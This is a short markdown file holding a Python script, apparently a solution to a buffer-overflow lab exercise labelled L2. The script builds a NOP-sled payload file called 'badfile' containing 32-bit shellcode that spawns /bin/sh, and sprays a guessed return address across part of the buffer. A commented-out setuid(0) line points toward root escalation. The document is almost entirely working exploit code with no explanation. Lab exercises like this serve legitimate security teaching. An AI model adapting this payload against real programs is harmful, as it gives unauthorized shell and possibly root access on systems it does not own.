# 5

## L2

```py
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  #"\x31\xdb\x31\xc0\xb0\xd5\xcd\x80" # setuid(0)
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
fp = 0xffffca68
sp = fp + 4

# buf_fp_offset
start = len(content) - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = fp + 200
L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
for offset in range(100, 200, 4):
    content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```
